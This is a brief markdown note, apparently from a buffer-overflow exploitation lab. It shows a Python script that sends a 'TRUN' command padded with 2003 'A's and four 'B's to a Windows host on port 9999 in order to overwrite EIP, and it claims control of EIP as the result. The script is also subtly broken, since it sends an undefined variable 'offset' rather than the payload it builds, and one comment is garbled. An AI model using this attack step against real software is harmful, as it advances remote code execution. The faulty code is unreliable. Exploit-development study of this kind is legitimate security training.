# Overwriting EIP

- modifying the offset finding file

```python
#!/usr/bin/python
import sys, socket 

# 2003 As because that's where EIP starts 
# we don't want to overwrite EIP with A to avoid confusion
# 1 stands for A 2 stands for B 
shellcode = "A" * 2003 + "B" * 4

try: 
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('<windows_ip>', 9999))
	s.send(('TRUN /.:/' + offset))
	s.close()
except:
	print "Error connecting to server"
	sys.exit()
```

- run the python script
- All four bytes of B sent ended up overwriting EIP
- now we have control of EIP
